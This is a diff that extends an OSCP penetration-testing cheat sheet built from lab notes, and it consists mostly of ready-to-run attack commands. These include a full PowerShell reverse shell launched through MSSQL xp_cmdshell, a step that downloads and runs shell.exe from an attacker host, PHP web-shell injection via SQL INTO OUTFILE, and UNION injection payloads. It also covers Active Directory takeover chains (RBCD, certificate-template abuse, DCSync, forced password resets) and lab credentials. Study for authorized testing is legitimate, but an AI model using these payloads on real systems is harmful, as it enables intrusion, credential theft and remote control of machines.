@@ -1,6 +1,14 @@
 # OSCP Consolidated Commands Reference
 
-This document provides a comprehensive reference of working commands extracted from lab machine notes. Each section follows a logical penetration testing flow and includes multiple variations (flags, authentication levels) for maximum reliability.
+## 🚀 Quick Navigation (Master Index)
+- [#smbenum] - SMB Enumeration & Recursive Harvest
+- [#ftpenum] - FTP Enumeration & Recursive Harvest
+- [#sqlimastery] - SQL Injection (All DBs) & Manual Escapes
+- [#mssqlmastery] - MSSQL RCE (xp_cmdshell), sqlcmd, & Impersonation
+- [#adattacks] - Kerberoasting, AS-REP Roasting, RBCD [Nagoya/Poseidon/Medtech]
+- [#privesc] - Linux & Windows Privilege Escalation
+- [#revshells] - Reverse Shell Cheat Sheet (The "Tak Tak Tak")
+- [#hydrabruteforce] - Service Brute Forcing
 
 ---
 
@@ -135,6 +143,11 @@ Try null sessions and guest accounts first.
   smbclient -L //10.10.10.10 -N
   rpcclient -U "" -N 10.10.10.10
   ```
+- **Recursive Share Harvesting (smbclient) [#smbenum]**:
+  - *Method (Nagoya)*: `smbclient //192.168.243.21/SYSVOL -U 'nagoya-industries.com/Craig.Carr%Spring2023' -c 'prompt OFF; recurse ON; mget *'`
+  - *Why*: Dumps all files locally while preserving directory structure.
+- **SMBGet (Alternative Recursive Downloader)**:
+  - `smbget -R smb://[IP]/[SHARE] -u [USER] -p [PASS]`
 - **Check Null Session (Shares):**
   ```bash
   netexec smb 10.10.10.10 -u '' -p ''
@@ -202,6 +215,11 @@ Try null sessions and guest accounts first.
   - 2. Listen: `impacket-smbserver share . -smb2support`
   - 3. Upload `.lnk` file to the victim share. Wait for capture.
 
+### FTP Enumeration [#ftpenum]
+- **FTP Recursive Download**:
+  - `wget -r ftp://[USER]:[PASS]@[IP]/`
+  - `lftp -u [USER],[PASS] [IP] -e "mirror --parallel=10; exit"`
+
 ### LDAP Enumeration
 - **Null Base Search:**
   ```bash
@@ -254,31 +272,57 @@ snmp-check [IP] -c [COMMUNITY]
 
 ---
 
-## 2. Active Directory (Windows)
+### 2. Active Directory (Windows) [#adattacks]
 
-### Roasting Attacks
+#### 🦜 1. Roasting (Initial Credential Access)
 - **AS-REP Roasting (No initial creds needed):**
-  - **Impacket**: `impacket-GetNPUsers [DOMAIN]/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.10`
-  - **Rubeus**: `Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt`
-- **Inter-Domain Ticket Abuse (Rubeus -> Kali)**:
+  - **Impacket**: `impacket-GetNPUsers [DOMAIN]/ -usersfile users.txt -format hashcat -dc-ip [IP]` [General]
+  - **Rubeus**: `Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt` [Windows Foothold]
+- **Kerberoasting (Requires user creds):**
+  - **Impacket**: `impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request` [General]
+  - **Rubeus**: `.\Rubeus.exe kerberoast /outfile:hashes.txt` (Dumps for local cracking)
+- **Inter-Domain Ticket Abuse (Nagoya/Poseidon Style)**:
+  - *Scenario*: Compromise parent domain from child.
   ```bash
-  # 1. Export ticket from DC02 (Windows)
+  # 1. Export ticket on DC02 (Nagoya/Poseidon)
   .\Rubeus.exe dump /nowrap
   # 2. Save and convert on Kali
-  echo "<BASE64_TICKET>" | base64 -d > ticket.kirbi
-  impacket-ticketConverter ticket.kirbi ticket.ccache
-  # 3. Setup local krb5.conf (Required for inter-domain routing)
-  # [realms] MARINE.COM = { kdc = 100.130.140.200 ... }
-  # 4. Get ST and DCSync
-  export KRB5CCNAME=ticket.ccache
+  echo "<B64>" | base64 -d > tgt.kirbi
+  impacket-ticketConverter tgt.kirbi tgt.ccache
+  # 3. Setup local krb5.conf (Crucial for Nagoya/Poseidon Trust)
+  export KRB5CCNAME=tgt.ccache
   export KRB5_CONFIG=./krb5.conf
-  kvno cifs/dc01.marine.com
-  impacket-secretsdump -k -no-pass -dc-ip 100.130.140.200 -just-dc-user 'MARINE/Administrator' dc01.marine.com
+  kvno cifs/dc01.parent.local
+  impacket-secretsdump -k -no-pass -dc-ip [DC_IP] -just-dc-user 'PARENT/Administrator' dc01.parent.local
   ```
-- **Kerberoasting (Requires user creds):**
-  - **Impacket**: `impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request`
-  - **Rubeus**: `.\Rubeus.exe kerberoast /outfile:hashes.txt` (Dumps for local cracking)
-  - **Cracking**: `hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt`
+
+#### 🛡️ 2. Object Manipulation (bloodyAD & RPC)
+- **Reset User Password (ForceChangePassword) [Poseidon/Medtech]**:
+  - `bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host [IP] set password [TARGET] 'NewPass123!'`
+  - `net rpc password [TARGET] 'NewPass123!' -U 'DOMAIN/user%pass' -S [IP]`
+- **Add User to Group (GenericAll/WriteMember) [Zeus]**:
+  - `bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host [IP] add groupMember 'Domain Admins' 'my_user'`
+- **Set SPN for Kerberoasting (GenericWrite) [Forest]**:
+  - `bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host [IP] set object [TARGET] servicePrincipalName -v 'http/target'`
+
+#### 🏗️ 3. Advanced AD Paths (RBCD & AD CS)
+- **RBCD (Resource-Based Constrained Delegation) [Poseidon]**:
+  1. `impacket-addcomputer [DOMAIN]/[USER]:[PASS] -computer-name 'FOO$' -computer-pass 'Bar123!'`
+  2. `bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host [IP] add rbcd '[TARGET]$'' 'FOO$'`
+  3. `impacket-getST -dc-ip [IP] -spn 'cifs/TARGET' -impersonate Administrator 'DOMAIN/FOO$:Bar123!'`
+- **AD CS - ESC1 (Enrollee Supplies Subject) [Medtech]**:
+  - `certipy find -u [USER]@[DOMAIN] -p [PASS] -dc-ip [IP] -vulnerable`
+  - `certipy req -u [USER]@[DOMAIN] -p [PASS] -ca [CA] -template [TEMPLATE] -upn administrator@[DOMAIN]`
+
+#### 🏹 4. Lateral Movement & Hash Theft
+- **NTLM Capture (LNK Theft) [Hutch/OSCPB]**:
+  ```bash
+  python3 ntlm_theft.py -g lnk -s [KALI_IP] -f trigger
+  impacket-smbserver share . -smb2support
+  ```
+- **Secretsdump (Credential Dumping)**:
+  - `impacket-secretsdump [DOMAIN]/[USER]:[PASS]@[IP]` [Standard]
+  - `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` [Offline]
 
 - **RPC Password Change (ForceChangePassword)**:
   - *Why*: If you have ForceChangePassword rights over another user.
@@ -644,6 +688,80 @@ Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded 
   - 2. Upload shell as `shell.php16`. The server will now execute it as PHP.
 - **Client-Side Bypass**: Use Burp to intercept and change extension/MIME type.
 - **Double Extension**: `shell.php.jpg` or `shell.php.png`
+
+### Application### SQL Injection & MSSQL Mastery [#sqlimastery] [#mssqlmastery]
+
+#### 🔍 1. Discovery Checklist (Credential & Config Paths)
+Before attacking, check these paths for leaked DB credentials:
+- **Windows**:
+  - `C:\inetpub\wwwroot\web.config` [Medtech]
+  - `C:\xampp\php\php.ini`
+  - `C:\Windows\System32\drivers\etc\hosts` (Check for DB hostnames)
+- **Linux**:
+  - `/var/www/html/config.php`
+  - `/etc/mysql/my.cnf`
+  - `/home/[USER]/.my.cnf`
+
+#### 🧪 2. SQL Injection (SQLi) Armory
+- **MySQL Web Shell Injection**:
+  - `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';` [Basic]
+- **Error-Based Discovery (MSSQL)**:
+  - `' AND 1=(SELECT QUOTENAME(name) FROM sys.databases FOR XML PATH('')) --`
+- **Stacked Queries (Enable xp_cmdshell)**:
+  - `'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --` [Medtech/Nagoya]
+
+#### 🏹 3. MSSQL RCE & Reverse Shells
+- **Nagoya PowerShell RevShell (xp_cmdshell)**:
+  ```sql
+  EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(''[KALI_IP]'',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65536|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + '''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
+  ```
+- **Medtech Reverse Shell (exe upload)**:
+  1. `EXEC xp_cmdshell "powershell.exe wget http://[IP]/shell.exe -OutFile c:\Users\Public\s.exe"`
+  2. `EXEC xp_cmdshell "c:\Users\Public\s.exe"`
+
+#### 📊 4. Data Dumping (sqlcmd & Manual)
+- **Dump All Tables (Nagoya/Medtech Rule)**:
+  - `EXEC xp_cmdshell 'sqlcmd -S .\SQLEXPRESS -E -d [DB] -Q "EXEC sp_MSforeachtable ''SELECT ''''?'''' AS TableName, * FROM ?''" -o C:\Users\Public\dump.txt'`
+- **List Databases**: `SELECT name FROM sys.databases;`
+- **Sqlmap (Automated):**
+  ```bash
+  sqlmap -u "http://10.10.10.10/page.php?id=1" --dbms mysql --batch --dump
+  sqlmap -r request.txt --level 5 --risk 3
+  ```
+
+#### 🛡️ SQLi Armory (Bypass & Payload Collection)
+| DB Type | Payload (Schema/Table/User Dump) | Notes |
+| :--- | :--- | :--- |
+| **MySQL** | `" UNION SELECT 1,2,3,schema_name FROM information_schema.schemata -- -` | Use `-- -` or `#` |
+| **Postgres** | `' UNION SELECT NULL,NULL,NULL,table_schema FROM information_schema.schemata --` | Data-type sensitive; use NULLs |
+| **MS-SQL** | `' UNION SELECT 1,2,3,name FROM sys.databases --` | `information_schema` also works |
+| **Oracle** | `' UNION SELECT NULL,NULL FROM dual --` | Always requires `FROM [TABLE]` |
+| **SQLite** | `' UNION SELECT 1,2,3,sql FROM sqlite_master --` | No `information_schema` |
+
+#### 🧪 Manual SQLi Testing (Triage & Escape Checklist)
+
+- **Standard**: `" UNION SELECT 1,2,3,schema_name FROM information_schema.schemata -- -`
+- **Initial Setup (Schlix/WordPress pattern)**:
+  ```sql
+  CREATE DATABASE schlix_db;
+  CREATE USER 'Hacked'@'%' IDENTIFIED BY 'Hacked';
+  GRANT ALL PRIVILEGES ON *.* TO 'Hacked'@'%';
+  FLUSH PRIVILEGES;
+  ```
+- **Check for File Permissions**:
+  ```sql
+  SELECT user, host, file_priv FROM mysql.user WHERE user = 'root';
+  SHOW VARIABLES LIKE "secure_file_priv"; 
+  # If empty/NULL -> Writable. If path -> Only that path.
+  ```
+- **Web Shell Injection**:
+  - *Path*: Find via `phpinfo()` or defaults (`C:/wamp64/www/`, `/var/www/html/`).
+  ```sql
+  SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/wamp64/www/shell.php';
+  ```
+- **File Read (Exfiltration)**:
+  - `SELECT LOAD_FILE('/etc/passwd');`
+  - `SELECT LOAD_FILE('C:/windows/win.ini');`
 
 ### Application Specific RCE
 - **ManageEngine Applications Manager (Port 8443)**:
